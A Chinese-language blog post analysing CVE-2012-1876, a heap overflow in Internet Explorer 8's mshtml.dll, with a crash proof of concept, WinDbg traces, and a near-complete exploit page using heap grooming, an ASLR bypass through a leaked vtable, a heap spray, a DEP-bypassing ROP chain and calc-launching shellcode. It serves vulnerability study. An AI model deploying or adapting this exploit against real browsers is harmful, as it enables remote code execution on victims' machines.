---
title: CVE-2012-1876调试分析
date: 2019-07-10 20:19:25
tags: pwn
---

## CVE-2012-1876

### 1. 漏洞简介

一个IE漏洞，成功利用可RCE，问题在mshtml.dll模块的CTableLayout::CalculateMinMax函数中，程序在执行时会以HTML代码中\元素的span属性作为循环控制次数向堆空间写入数据，如果此span值设置的不当，那么就会触发堆溢出问题。

其中mshtml.dll模块是IE中的重要组件，用来解析HTML和CSS。（微软官方说明https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）

系统：Win7 Pro x86

版本：IE8.0.7601.17514

<!-- more -->


### 2. PoC

```html
<html>
<body>
    <table style="table-layout:fixed" >
        <col id="132" width="41" span="6" >&nbsp </col>
    </table>

    <script>

    function over_trigger() {
        var obj_col = document.getElementById("132");
        obj_col.width = "42765";
        obj_col.span = 666;
    }

    setTimeout("over_trigger();",1);

    </script>
</body>
</html>
```

上述代码的功能十分清晰，最开始时span的属性值为6，而后通过js中的over_trigger函数将其动态更新为666，当然，更新后的值可以是任意的，只要能保证溢出就可以。另外，width的属性值和写入堆空间的内容有关。



### 3. 调试

强制下载符号表

```
0:018> .reload /f mshtml.dll
```

然后下以下断点：

这里，由于错误定位是在CTableLayout::CalculateMinMax函数中，所以要下个断点；又因为是个堆溢出，所以HeapRealloc也要下断点；最后的CTableCol::GetAAspan断点是用来获取span属性的。

首先禁用后两个断点，只停在CalculateMinMax处。

```
0:013> bl
0:013> bp mshtml!CTableLayout::CalculateMinMax
0:013> bp mshtml!_HeapRealloc
0:013> bp mshtml!CTableCol::GetAAspan
0:013> b l
0:013> bd 1 2
0:013> bl
 0 e 67c7a078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax
 1 d 67d2d7a5     0001 (0001)  0:**** mshtml!_HeapRealloc
 2 d 67bfa6cb     0001 (0001)  0:**** mshtml!CTableCol::GetAAspan

```

g运行起来，并允许阻止的内容，终于成功断到了断点处。查看栈现场：

```
0:005> kb 5
ChildEBP RetAddr  Args to Child              
024ec67c 6b68a6b8 006736f0 024ec910 00000000 mshtml!CTableLayout::CalculateMinMax
024ec898 6b680879 024ec910 024ec8dc 00000001 mshtml!CTableLayout::CalculateLayout+0x276
024eca44 6b78566c 024ed960 024ecc70 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720
024ecb7c 6b7818f9 006736f0 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8
024ecc40 6b781646 006736f0 0002ddfc 0002ddfc mshtml!CFlowLayout::MeasureSite+0x312
```

函数的函数声明如下：

```c++
void __thiscall CTableLayout::CalculateMinMax(CTableLayout *__hidden this, struct CTableCalcInfo *, int)
```

我们主要关心函数的第一个参数，即类型为CTableLayout的指针，由上面的调用栈看出其地址为0x6736f0。ln指令查看就近的符号，poi(xxx)表示解引用。

```
0:005> ln poi(0x6736f0)
(6b589960)   mshtml!CTableLayout::`vftable'   |  (6b589aa0)   mshtml!CTableLayoutBlock::`vftable'
Exact matches:
    mshtml!CTableLayout::`vftable' = <no type information>

```

```
0:005> dd 0x6736f0
006736f0  6b589960 006ba180 0069c1b8 6b73e3b8 # 其中0x6b589960是vtable值
00673700  00000001 00000000 0108080d ffffffff
00673710  00000000 00000000 00000000 ffffffff
00673720  0002ddfc 00015248 00000000 00000000
00673730  00000000 00412802 00000000 00000000
00673740  00000000 00000006 ffffffff ffffffff # 其中0x00000006是属性span的值
00673750  ffffffff ffffffff 6b58a594 00000004
00673760  00000004 00706338 6b58a594 00000018

```



然后继续调试，断在分配堆空间的函数_HeapRealloc。gu执行到函数返回，分配结束后查看。

```
0:005> g
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=000000a8 edx=00000000 esi=0067378c edi=00673780 # 0xa8为分配的空间 0x67378c为申请的地址
eip=6b73d7a5 esp=024ec5b4 ebp=024ec5cc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!_HeapRealloc:
6b73d7a5 8bff            mov     edi,edi
0:005> gu
eax=00000000 ebx=00000000 ecx=77c05dd3 edx=006f179f esi=0067378c edi=00673780
eip=6b7534e2 esp=024ec5bc ebp=024ec5cc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CImplAry::EnsureSizeWorker+0xa1:
6b7534e2 8bd8            mov     ebx,eax
0:005> dd 0x6736f0 L30
006736f0  6b589960 006ba180 0069c1b8 6b73e3b8
00673700  00000001 00000000 0108080d ffffffff
00673710  00000000 00000000 00000000 ffffffff
00673720  0002ddfc 00015248 00000000 00000000
00673730  00000000 00412802 00000000 00000000
00673740  00000000 00000006 00000000 ffffffff
00673750  00000000 ffffffff 6b58a594 00000004
00673760  00000004 00706338 6b58a594 00000018
00673770  00000006 006af428 00000000 00000000
00673780  6b58a594 00000000 00000000 006f17a0 # 分配的地址为0x6f17a0
00673790  00000000 00000000 00000000 00000000
006737a0  00000000 00000000 00000000 00000000

```

程序申请了堆空间用于保存column的样式信息，每个样式信息占0x1c字节，有多少个样式信息由span属性决定，因此申请0x1c*6 = 0xa8，即_HeapRealloc函数入口断下后ecx寄存器的值，函数调用时的入参如果用到寄存器的话一般都是ecx，返回参数在eax中。同时注意随后分配的初始地址会保存在esi寄存器对应的地址处，即0x6f17a0。

继续运行程序会在CTableCol::GetAAspan处断下来，也就是获取span值作为写入样式信息时循环的控制次数，返回值保存在eax中，此处为6.

```
0:005> g
Breakpoint 2 hit
eax=006764f0 ebx=006736f0 ecx=00000032 edx=00000006 esi=006f1848 edi=006764f0
eip=6b60a6cb esp=024ec5d4 ebp=024ec67c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CTableCol::GetAAspan:
6b60a6cb 8bff            mov     edi,edi
0:005> gu
eax=00000006 ebx=006736f0 ecx=00000002 edx=00682128 esi=006f1848 edi=006764f0
eip=6b81f31f esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CTableLayout::CalculateMinMax+0x3ac:
6b81f31f 3de8030000      cmp     eax,3E8h
```

然后在刚刚分配的地址处下条件断点（写入时断下），查看向申请的堆空间写入样式信息的过程。

```
0:005> g
Breakpoint 3 hit
eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=006f17b8
eip=6b9b0a49 esp=024ec5bc ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x2f:
6b9b0a49 eb2a            jmp     mshtml!CTableColCalc::AdjustForCol+0x5b (6b9b0a75)
0:005> ub
mshtml!CTableColCalc::AdjustForCol+0x1c:
6b9b0a36 85c0            test    eax,eax
6b9b0a38 7411            je      mshtml!CTableColCalc::AdjustForCol+0x31 (6b9b0a4b)
6b9b0a3a 6a08            push    8
6b9b0a3c 57              push    edi
6b9b0a3d 8bc3            mov     eax,ebx
6b9b0a3f e83dacbdff      call    mshtml!CUnitValue::SetValue (6b58b681)
6b9b0a44 895e04          mov     dword ptr [esi+4],ebx
6b9b0a47 891e            mov     dword ptr [esi],ebx
0:005> dd 006f17a0 L30
006f17a0  00001004 00001004 00000000 00000000
006f17b0  00000000 00000000 00010048 00000000
006f17c0  00000000 00000000 00000000 00000000
006f17d0  00000000 00000000 00000000 00000000
006f17e0  00000000 00000000 00000000 00000000
006f17f0  00000000 00000000 00000000 00000000
006f1800  00000000 00000000 00000000 00000000
006f1810  00000000 00000000 00000000 00000000
006f1820  00000000 00000000 00000000 00000000
006f1830  00000000 00000000 00000000 00000000
006f1840  00000000 00000000 3c73b87b 0800285c
006f1850  00689350 00689410 b67bb8f9 08002848

```

由poc看出width属性值为41，写入的为41*100=0x1004，事实上程序断下来的时候0x1c个字节的写入已经完成。然后一直单步跟：

```
0:005> p
eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=006f17b8
eip=6b9b0a75 esp=024ec5bc ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x5b:
6b9b0a75 5f              pop     edi
0:005> p
eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b9b0a76 esp=024ec5c0 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x5c:
6b9b0a76 895e08          mov     dword ptr [esi+8],ebx ds:0023:006f17a8=00000000
0:005> p
eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b9b0a79 esp=024ec5c0 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x5f:
6b9b0a79 5b              pop     ebx
0:005> p
eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b9b0a7a esp=024ec5c4 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x60:
6b9b0a7a 5d              pop     ebp
0:005> p
eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b9b0a7b esp=024ec5c8 ebp=024ec67c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x61:
6b9b0a7b c20c00          ret     0Ch
0:005> p
eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b81f47a esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableLayout::CalculateMinMax+0x558:
6b81f47a ff45ec          inc     dword ptr [ebp-14h]  ss:0023:024ec668=00000000
0:005> p
eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b81f47d esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CTableLayout::CalculateMinMax+0x55b:
6b81f47d 8b45ec          mov     eax,dword ptr [ebp-14h] ss:0023:024ec668=00000001
0:005> p
eax=00000001 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b81f480 esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CTableLayout::CalculateMinMax+0x55e:
6b81f480 8345dc1c        add     dword ptr [ebp-24h],1Ch ss:0023:024ec658=00000000
0:005> p
eax=00000001 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001
eip=6b81f484 esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CTableLayout::CalculateMinMax+0x562:
6b81f484 3b4510          cmp     eax,dword ptr [ebp+10h] ss:0023:024ec68c=00000006

```

出现了inc+cmp指令序列，猜想这就是控制堆空间写入样式信息的循环了，这几条汇编的含义是ebp-14处的变量(计数器)每次+1，然后放到eax中，只要与ebp+10处的参数不相同（这里为span的数值），就继续循环。

```
0:005> d ebp+0x10
024ec68c  00000006 00000000 006736f0 006736f0 # span为6
0:005> d ebp-0x14
024ec668  00000001 00000000 00001004 00000000 # counter此时为1

```

然后看下通过js脚本动态更新span之后，程序第二次在CalculateMinMax入口断下时是什么情形，理论上需要重新分配堆空间，毕竟要多写入660个样式信息，而后再获取此时的span值作为循环控制次数，最后才向堆空间写入样式信息。

第二次断在入口时：

```
0:005> bd 1 2 3
0:005> g
Breakpoint 0 hit
eax=ffffffff ebx=006736f0 ecx=00402c02 edx=ffffffff esi=00000000 edi=024ec0f4
eip=6b68a078 esp=024ebe98 ebp=024ec0b0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CTableLayout::CalculateMinMax:
6b68a078 8bff            mov     edi,edi
0:005> dd 006f17a0 L30
006f17a0  00001004 00001004 00001004 00000000
006f17b0  00000000 00000000 00010048 00001004
006f17c0  00001004 00001004 00000000 00000000
006f17d0  00000000 00010048 00001004 00001004
006f17e0  00001004 00000000 00000000 00000000
006f17f0  00010048 00001004 00001004 00001004
006f1800  00000000 00000000 00000000 00010048
006f1810  00001004 00001004 00001004 00000000
006f1820  00000000 00000000 00010048 00001004
006f1830  00001004 00001004 00000000 00000000
006f1840  00000000 00010048 3c73b87b 0800285c
006f1850  00689350 00689410 b67bb8f9 08002848

```

确实写入了6个0x1c的样式信息。



然后接下来要写入样式信息了：

```
0:005> be 1 2
0:005> bl
 0 e 6b68a078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax
 1 e 6b73d7a5     0001 (0001)  0:**** mshtml!_HeapRealloc
 2 e 6b60a6cb     0001 (0001)  0:**** mshtml!CTableCol::GetAAspan
 3 d 006f17a0 w 1 0001 (0001)  0:**** 
0:005> g
Breakpoint 2 hit
eax=006764f0 ebx=006736f0 ecx=00000032 edx=00000006 esi=006f1848 edi=006764f0
eip=6b60a6cb esp=024ebdec ebp=024ebe94 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CTableCol::GetAAspan:
6b60a6cb 8bff            mov     edi,edi
0:005> gu
eax=0000029a ebx=006736f0 ecx=00000002 edx=00682128 esi=006f1848 edi=006764f0
eip=6b81f31f esp=024ebdf0 ebp=024ebe94 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CTableLayout::CalculateMinMax+0x3ac:
6b81f31f 3de8030000      cmp     eax,3E8h

```

eax为0x29a，即666.

接下来和前面一样是写入样式信息的过程，不过这次是对**只能容纳6个样式信息的堆空间写入了666个样式信息**，从而引发了堆溢出错误。

```
0:005> dd ebp+0x10
024ebea4  0000029a
```

### 4. exp

```html
<html>
<body>
<div id="evil"></div>
<table style="table-layout:fixed"><col id="132" width="41" span="9">&nbsp;</col></table>
<script language='javascript'>

//将字符串转换为整数
function strtoint(str) {
    return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);
}

//初始化布局的字符串变量
var free = "EEEE";
while ( free.length < 500 ) free += free;
var string1 = "AAAA";
while ( string1.length < 500 ) string1 += string1;
var string2 = "BBBB";
while ( string2.length < 500 ) string2 += string2;

var fr = new Array();
var al = new Array();
var bl = new Array();
var div_container = document.getElementById("evil");
div_container.style.cssText = "display:none";

//接着按字符串E、字符串A、字符串B、CButtonLayout对象进行堆空间布局
for (var i=0; i < 500; i+=2) {
    fr[i] = free.substring(0, (0x100-6)/2);
    al[i] = string1.substring(0, (0x100-6)/2);
    bl[i] = string2.substring(0, (0x100-6)/2);
    var obj = document.createElement("button");
    div_container.appendChild(obj);
}

//释放布局后字符串E对应的堆空间
for (var i=200; i<500; i+=2 ) {
    fr[i] = null;
    CollectGarbage();
}

//进行ROP链中Gadget地址和参数的布局，并与填充数据以及shellcode拼接完成堆喷数据的初始化
//最后执行堆喷将这些数据布局到内存中
function heapspray(cbuttonlayout) {
    CollectGarbage();
    //处理各个Gadget的地址信息
    var rop = cbuttonlayout + 4161; // RET
    var rop = rop.toString(16);
    var rop1 = rop.substring(4,8);
    var rop2 = rop.substring(0,4); // } RET

    //......省略，可参见https://www.exploit-db.com/exploits/24017/

    var rop = cbuttonlayout + 408958; // PUSH ESP
    var rop = rop.toString(16);
    var rop23 = rop.substring(4,8);
    var rop24 = rop.substring(0,4); // } RET

    var shellcode = unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
    shellcode+= unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
    shellcode+= unescape("%u4141%u4141"); // PADDING

    //ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过
    shellcode+= unescape("%u"+rop1+"%u"+rop2); // RETN
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP # RETN
    shellcode+= unescape("%u"+rop5+"%u"+rop6); // XCHG EAX,ESP # RETN
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP
    shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP
    shellcode+= unescape("%u"+rop7+"%u"+rop8); // POP EBP
    shellcode+= unescape("%u1024%u0000"); // Size 0x00001024
    shellcode+= unescape("%u"+rop9+"%u"+rop10); // POP EDX
    shellcode+= unescape("%u0040%u0000"); // 0x00000040
    shellcode+= unescape("%u"+rop11+"%u"+rop12); // POP ECX
    shellcode+= unescape("%u"+writable1+"%u"+writable2); // Writable Location
    shellcode+= unescape("%u"+rop13+"%u"+rop14); // POP EDI
    shellcode+= unescape("%u"+rop1+"%u"+rop2); // RET
    shellcode+= unescape("%u"+rop15+"%u"+rop16); // POP ESI
    shellcode+= unescape("%u"+jmpeax1+"%u"+jmpeax2); // JMP EAX
    shellcode+= unescape("%u"+rop17+"%u"+rop18); // POP EAX
    shellcode+= unescape("%u"+vp1+"%u"+vp2); // VirtualProtect()
    shellcode+= unescape("%u"+rop19+"%u"+rop20); // MOV EAX,DWORD PTR DS:[EAX]
    shellcode+= unescape("%u"+rop21+"%u"+rop22); // PUSHAD
    shellcode+= unescape("%u"+rop23+"%u"+rop24); // PUSH ESP
    shellcode+= unescape("%u9090%u9090"); // NOPs
    shellcode+= unescape("%u9090%u9090"); // NOPs
    shellcode+= unescape("%u9090%u9090"); // NOPs

    //弹出计算器的shellcode
    shellcode+= unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" + 
                             "%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" + 
                             "%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" + 
                             "%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" + 
                             "%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" + 
                             "%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" + 
                             "%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" + 
                             "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" + 
                             "%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" + 
                             "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" + 
                             "%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" + 
                             "%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" + 
                             "%u6c61%u2e63%u7865%u0065");

    //初始化堆喷数据
    var padding = unescape("%u9090");
    while (padding.length < 1000)
        padding = padding + padding;
    var padding = padding.substr(0, 1000 - shellcode.length);
    shellcode+= padding;
    while (shellcode.length < 100000)
        shellcode = shellcode + shellcode;
    var onemeg = shellcode.substr(0, 64*1024/2);
    for (i=0; i<14; i++) {
        onemeg += shellcode.substr(0, 64*1024/2);
    }
    onemeg += shellcode.substr(0, (64*1024/2)-(38/2));

    //通过堆喷布局rop和shellcode
    var spray = new Array();
    for (i=0; i<100; i++) {
        spray[i] = onemeg.substr(0, onemeg.length);
    }
}

//触发第一次堆溢出用以获取泄露的mshtml模块基址
function leak() {
    var leak_col = document.getElementById("132");
    leak_col.width = "41";
    leak_col.span = "19";
}

//计算mshtml模块基址，并通过堆喷进行rop和shellcode布局
function get_leak() {
    var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13));
    str_addr = str_addr - 1410704;
    setTimeout(function(){heapspray(str_addr)}, 50);
}

//触发第二次堆溢出用以覆盖虚表指针，使程序转到rop处执行
function trigger_overflow() {
    var evil_col = document.getElementById("132");
    evil_col.width = "1278888";
    evil_col.span = "29";
}

setTimeout(function(){leak()}, 400);
setTimeout(function(){get_leak()}, 450);
setTimeout(function(){trigger_overflow()}, 1000);

</script>
</body>
</html>
```



### 5. 利用详解

#### 绕过ASLR

读取**mshtml!CButtonLayout对象的vftable值**可以计算出mshtml.dll模块的基地址，因为该值位于此模块中的固定偏移处，所以可被利用以绕过ASLR，计算出mshtml模块的加载基址（类似Glibc中的main arean的地址）。

最开始需要对堆空间进行布局，关键代码如下：

```javascript
//初始化布局的字符串变量
var free = "EEEE";
while ( free.length < 500 ) free += free;
var string1 = "AAAA";
while ( string1.length < 500 ) string1 += string1;
var string2 = "BBBB";
while ( string2.length < 500 ) string2 += string2;

var fr = new Array();
var al = new Array();
var bl = new Array();
var div_container = document.getElementById("evil");
div_container.style.cssText = "display:none";

//接着按字符串E、字符串A、字符串B、CButtonLayout对象进行堆空间布局
for (var i=0; i < 500; i+=2) {
    fr[i] = free.substring(0, (0x100-6)/2);
    al[i] = string1.substring(0, (0x100-6)/2);
    bl[i] = string2.substring(0, (0x100-6)/2);
    var obj = document.createElement("button");
    div_container.appendChild(obj);
}

//释放布局后字符串E对应的堆空间
for (var i=200; i<500; i+=2 ) {
    fr[i] = null;
    CollectGarbage();
}
```

上述代码中的字符串将会分配到堆空间中，并且被转换为BSTR对象（COM）：此对象包含头部和尾部，字符以UNICODE存储，头部4个字节表示字符串长度，尾部2个字节表示结束。比如执行一次下述代码：

```javascript
al[i] = string1.substring(0, (0x100 - 6)/2);
```

与其对应的内存结构就应该如下


一块占用0x100的内存空间

代码在布局时会连续填充字符串，由堆空间管理的性质可知分配的这些堆空间最终会紧挨在一起，因此内存中的分布会如上图那样彼此间相邻。同时，这里还利用了堆空间管理中的另一性质（和Glibc的bin机制相似），即当某块堆空间被释放后如果接下来又有新的申请堆空间操作且此释放掉的空间大小合适，那么会将释放掉的该堆空间重新分配给此时的申请操作。我们注意如下代码：

```html
<table style="table-layout:fixed"><col id="132" width="41" span="9">&nbsp;</col></table>
```

就这一块来说，程序将为其分配0x1c*9=0xfc字节大小的堆空间，而在布局时释放掉的那些堆空间大小为0x100字节，所以最后释放掉的那块堆空间将会重新分配来保存column的样式信息。最终内存中的分布会是如下这个样子：


为了计算mshtml.dll模块的基址，我们需要获取黄色区域标识的vftable数值，这里利用了堆溢出，同样，也是通过js代码动态更新span属性值的方式，修改BSTR对象的的size字段，从而可以按索引越界读取到vftable的值。



对这一块堆布局的代码调试如下：

在mshtml!_CTableCol::GetAAspan下断点，追踪esi指针即可定位到堆空间：

```
0:005> bp mshtml!CTableCol::GetAAspan
0:005> g
Breakpoint 2 hit
eax=004a8e80 ebx=004dee40 ecx=00000032 edx=00000009 esi=030c110c edi=004a8e80
eip=6872a6cb esp=0254bfbc ebp=0254c064 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CTableCol::GetAAspan:
6872a6cb 8bff            mov     edi,edi
0:005> gu
eax=00000009 ebx=004dee40 ecx=00000002 edx=004cbf88 esi=030c110c edi=004a8e80
eip=6893f31f esp=0254bfc0 ebp=0254c064 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CTableLayout::CalculateMinMax+0x3ac:
6893f31f 3de8030000      cmp     eax,3E8h
0:005> dd 030c110c L300
030c110c  00000045 2baf3432 88000000 000000fa
030c111c  00410041 00410041 00410041 00410041
030c112c  00410041 00410041 00410041 00410041
030c113c  00410041 00410041 00410041 00410041
030c114c  00410041 00410041 00410041 00410041
030c115c  00410041 00410041 00410041 00410041
030c116c  00410041 00410041 00410041 00410041
030c117c  00410041 00410041 00410041 00410041
030c118c  00410041 00410041 00410041 00410041
030c119c  00410041 00410041 00410041 00410041
030c11ac  00410041 00410041 00410041 00410041
030c11bc  00410041 00410041 00410041 00410041
030c11cc  00410041 00410041 00410041 00410041
030c11dc  00410041 00410041 00410041 00410041
030c11ec  00410041 00410041 00410041 00410041
030c11fc  00410041 00410041 00410041 00410041
030c120c  00410041 00410041 00000041 2baf3453
030c121c  88000000 000000fa 00420042 00420042 # 0xfa为字符串size
030c122c  00420042 00420042 00420042 00420042
030c123c  00420042 00420042 00420042 00420042
030c124c  00420042 00420042 00420042 00420042
030c125c  00420042 00420042 00420042 00420042
030c126c  00420042 00420042 00420042 00420042
030c127c  00420042 00420042 00420042 00420042
030c128c  00420042 00420042 00420042 00420042
030c129c  00420042 00420042 00420042 00420042
030c12ac  00420042 00420042 00420042 00420042
030c12bc  00420042 00420042 00420042 00420042
030c12cc  00420042 00420042 00420042 00420042
030c12dc  00420042 00420042 00420042 00420042
030c12ec  00420042 00420042 00420042 00420042
030c12fc  00420042 00420042 00420042 00420042
030c130c  00420042 00420042 00420042 00420042
030c131c  00000042 2baf3474 8c000000 687f84f8
030c132c  0049ca00 030bce00 687f8690 00000001 # 这里0x687f8690是需要leak的地址
030c133c  00000000 01080809 ffffffff 00000000
030c134c  00000000 00000000 ffffffff 00000080
030c135c  ffffffff 00000000 00000000 00000000
030c136c  00000000 00000000 00000024 00000020
030c137c  00000000 00000000 00000000 00000000
030c138c  00000000 00000000 00000000 00000000
030c139c  00000000 00000000 00000000 00000000
030c13ac  00000000 00000000 00000000 00000000

0:005> ln 687f8690 
(687f8690)   mshtml!CButtonLayout::`vftable'   |  (687f8738)   mshtml!CObjectImageLayout::`vftable'
Exact matches:
    mshtml!CButtonLayout::`vftable' = <no type information> 
```

需要利用堆溢出，通过js代码动态更新span属性值来达到目的。每一个都会写入一串0x1c的样式，所以要修改size的话需要`0x30c121c - 0x30c110c / 0x1c = 9 + 1 = 10`，再将span增加10，即修改span为19。写完后，字符串B的长度由0x000000fa变成了0x00010048，因此该对象能访问的内存空间变广了，这样我们就能通过如下代码获取到CButtonLayout对象的vftable值，最计算得到mshtml.dll模块的基址。

此段exp如下：

```javascript
function leak() {
  var leak_col = document.getElementById("132");
  leak_col.width = "41";
  leak_col.span = "19";
}

setTimeout(function(){leak(), 400});
```

然后获取模型基址的exp如下

**注：这里的bl[498]稍微令人有些费解，不过可以通过在exp中判断每个字符串的size是否被修改过从而定位到溢出的BSTR对象，类似漏洞战争一书中的exp**

```javascript
//计算mshtml模块基址，并通过堆喷进行rop和shellcode布局
function get_leak() {
    var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13));
    str_addr = str_addr - 1410704;
    //setTimeout(function(){heapspray(str_addr)}, 50);
}
```

其中红色位置，字符串长度被修改为0x10048，就可以溢出得到蓝色位置的值。

#### Heap Spray

在得到mshtml.dll模块的基址后，我们就有机会构造相应的ROP链来实现想要的功能了，那么现在需要解决另外一个问题，也就是如何让程序跳转到我们的ROP链执行。**此exp首先会利用堆喷技术将ROP链中的gadget地址和参数以及后面用到的shellcode布局到进程地址空间中的固定位置，而后再利用堆溢出重写CButtonLayout对象的虚表指针，使其指向前面提到的固定位置，这样当虚函数被调用时就会跳转到我们的ROP链中。**

将原先的width属性值设置为127888，那么样式值为**127888*0x100=0x079f6da0**，也就是可以把虚表指针覆盖为0x79f6da0，那么只要能通过堆喷将rop链的地址控制到这个地址即可。其实这个地址是事先计算出来的，下面会讲到。

P.S.：一些Windbg堆调试技巧如下：

> Windbg调试堆：
>
> !heap -stat显示被调试进程的所有堆使用情况
>
> !heap -a xxxxxxxx 显示关于xxxxxxxx处堆的详细情况，输出会有些多
>
> !heap -stat -h xxxxxxxx 查看xxxxxxxx堆的分配统计数据
>
> !heap -flt s 7ffe0 查看大小为7ffe0的内存，在堆喷的时候可以方便的找到payload所在的地址
>
> 0:007> !**heap** **-flt** **s** 7**ffe0**
>  _**HEAP** @ 140000
>    HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state 				// 这里HEAP_ENTRY是堆的头部，UserPtr是BSTR对象头部
>      02240018 fffc 0000  [0b]   02240020    7ffe0 - (busy VirtualAlloc)
>      01fe0018 fffc fffc  [0b]   01fe0020    7ffe0 - (busy VirtualAlloc)
>      022c0018 fffc fffc  [0b]   022c0020    7ffe0 - (busy VirtualAlloc)
>      02340018 fffc fffc  [0b]   02340020    7ffe0 - (busy VirtualAlloc)
> ...
> ...
>
> 0:007> **dd** 02240018
> 02240018  00000020 00000**b00** 0007**ffd4** 90909090
> 02240028  90909090 90909090 90909090 90909090
> 02240038  90909090 90909090 90909090 90909090
>
> !heap -p -a 0x0c0c0c0c查看0x0c0c0c0c处的数据属于哪个堆:



------

**堆喷射内存布局**

在浏览器中分配的字符串都会被转换为unicode，所以为了准确传递字符，我们需要使用JavaScript中的unescape函数，这个函数用于解码字符串，所以用已经是unicode的字符串，在内存中就不会再次被转换为unicode了，用%u加在每两字节之前，注意两字节要反序排列。分配字符串后会变成BSTR字符串对象，含有4字节的头信息和两个NULL字节的结尾。

一般的堆喷射内存布局就是大量的nop指令(也称为滑板指令)加上shellcode，shellcode放在每个块的尾部，只要保证喷射堆块足够大，那么预测的地址处就会是nop指令，然后执行到shellcode。

